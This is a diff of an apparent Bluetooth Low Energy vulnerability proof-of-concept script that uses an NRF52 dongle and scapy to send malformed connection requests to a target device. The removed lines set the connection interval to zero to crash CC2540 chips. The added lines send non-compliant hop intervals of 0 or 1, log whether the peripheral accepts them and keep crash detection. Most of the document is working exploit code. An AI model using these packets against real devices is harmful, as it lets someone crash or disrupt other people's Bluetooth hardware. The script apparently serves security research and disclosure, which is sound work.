@@ -5,7 +5,8 @@ import platform
 from time import sleep
 from threading import Timer
 # libs
-sys.path.insert(0,os.getcwd() + '/libs')
+sys.path.insert(0,os.getcwd() + '/../libs')
+sys.path.insert(0,os.getcwd() + '/../')
 import serial
 import colorama
 from colorama import Fore
@@ -13,8 +14,6 @@ from drivers.NRF52_dongle import NRF52Dongle
 from scapy.layers.bluetooth4LE import *
 from scapy.layers.bluetooth import *
 from scapy.utils import wrpcap
-from scapy.compat import raw
-
 
 none_count = 0
 slave_connected = False
@@ -22,7 +21,7 @@ send_version_ind = False
 end_connection = False
 
 def send(scapy_pkt, print_tx=True):
-	driver.raw_send(raw(scapy_pkt))
+	driver.send(scapy_pkt)
 	if print_tx:
 		print(Fore.CYAN + "TX ---> " + scapy_pkt.summary()[7:])
 
@@ -46,7 +45,7 @@ print(Fore.YELLOW + 'Serial port: ' + serial_port)
 if len(sys.argv) >= 3:
 	advertiser_address = sys.argv[2].lower()
 else:
-	advertiser_address = '38:81:d7:3d:45:a2'
+	advertiser_address = 'f8:f0:05:f3:66:e0'.upper()
 
 print(Fore.YELLOW + 'Advertiser Address: ' + advertiser_address.upper())
 
@@ -60,6 +59,10 @@ def scan_timeout():
 		scan_req = BTLE() / BTLE_ADV() / BTLE_SCAN_REQ(
 				ScanA=master_address,
 				AdvA=advertiser_address)
+		if conn_request.hop == 0:
+			conn_request.hop = 1
+		else:
+			conn_request.hop = 0
 		send(scan_req)
 
 	timeout_scan = Timer(5, scan_timeout)
@@ -71,7 +74,7 @@ def scan_timeout():
 master_address = '5d:36:ac:90:0b:22'
 access_address = 0x9a328370
 # Open serial port of NRF52 Dongle
-driver = NRF52Dongle(serial_port, '115200')
+driver = NRF52Dongle(serial_port, '115200', logs_pcap=True, pcap_filename = 'Microchip_and_others_non_compliant_connection.pcap')
 # Send scan request
 scan_req = BTLE() / BTLE_ADV(RxAdd=0) / BTLE_SCAN_REQ(
             ScanA=master_address,
@@ -86,7 +89,26 @@ timeout_scan.start()
 timeout = Timer(5.0, crash_timeout)
 timeout.daemon = True
 timeout.start()
-c = False
+
+already_connected = False
+
+conn_request = BTLE() / BTLE_ADV(RxAdd=0, TxAdd=1) / BTLE_CONNECT_REQ(
+InitA=master_address,
+AdvA=advertiser_address,
+AA=access_address, # Access address (any)
+crc_init=0x179a9c, # CRC init (any)
+win_size=2, # 2.5 of windows size (anchor connection window size)
+win_offset=2, # 1.25ms windows offset (anchor connection point)
+interval=16,  # 20ms connection interval
+latency=0, # Slave latency (any)
+timeout=50, # Supervision timeout, 500ms
+# ---------------------28 Bytes until here--------------------------
+# Truncated when sending over the air, but the initiator will try the following:
+chM=0x1FFFFFFFFF, 
+hop=0, # any, including 0
+SCA=0, # Clock tolerance
+)
+
 print(Fore.YELLOW + 'Waiting advertisements from ' + advertiser_address)
 while True:
 	pkt = None
@@ -102,44 +124,22 @@ while True:
 				print(Fore.RED + 'NRF52 Dongle not detected')
 				sys.exit(0)
 			continue
-		elif slave_connected and BTLE_EMPTY_PDU not in pkt:
-			# Print slave data channel PDUs summary
-			print(Fore.MAGENTA + "Slave RX <--- " + pkt.summary()[7:])
 		# --------------- Process Link Layer Packets here ------------------------------------
 		# Check if packet from advertised is received
-		if pkt:
-			print(Fore.MAGENTA + "Slave RX <--- " + pkt.summary()[7:])
+		if BTLE_DATA in pkt:
+			timeout.cancel()
+			print(Fore.YELLOW + "Slave RX <--- " + pkt.summary()[7:] + Fore.RESET)
+			print(Fore.RED + "Oops, peripheral accepted non-compliant connection hop interval of " \
+				+ str(conn_request.hop) + Fore.RESET)
+			if already_connected == False:
+				already_connected = True
+				driver.save_pcap()
 		if pkt and (BTLE_SCAN_RSP in pkt) and pkt.AdvA == advertiser_address.lower():
 			timeout.cancel()
 			print(Fore.GREEN + advertiser_address.upper() + ': ' + pkt.summary()[7:] + ' Detected')
-			# Send connection request to advertiser
-			conn_request = BTLE() / BTLE_ADV(RxAdd=0, TxAdd=1) / BTLE_CONNECT_REQ(
-            InitA=master_address,
-            AdvA=advertiser_address,
-            AA=access_address, # Access address (any)
-            crc_init=0x179a9c, # CRC init (any)
-            win_size=2, # 2.5 of windows size (anchor connection window size)
-            win_offset=2, # 1.25ms windows offset (anchor connection point)
-            interval=16,  # 20ms connection interval
-            latency=0, # Slave latency (any)
-            timeout=50, # Supervision timeout, 500ms
-            # ---------------------28 Bytes until here--------------------------
-            # Truncated when sending over the air, but the initiator will try the following:
-            chM=0x0000000001, 
-            hop=5, # any, including 0
-            SCA=0, # Clock tolerance
-			)
-			# This means that the initiator will send the anchor point (Empty PDU) on channel 1 and stay there for every connection event)
-			# conn_request[BTLE_ADV].Length=28 # Truncated, but CRC will be correct when sending over the air
-			conn_request[BTLE_CONNECT_REQ].interval=0 # Clearing the interval time triggers the crash.
-			#conn_request[BTLE_ADV].timeout=0 # Clearing the supervision timeout triggers the crash.
 
-
-			# chM=0x1FFFFFFFFF, 
-
-			# Yes, we're sending raw link layer messages in Python. Don't tell anyone as this is forbidden!!!		
-			send(conn_request)
-			wrpcap('CC2540_connection_req_crash.pcap', conn_request)
+			# Yes, we're sending raw link layer messages in Python. Don't tell anyone as this is forbidden!!!
+			send(conn_request) # Send connection request to advertiser
 			print(Fore.YELLOW + 'Malformed connection request was sent')
 
 			# Start the timeout to detect crashes
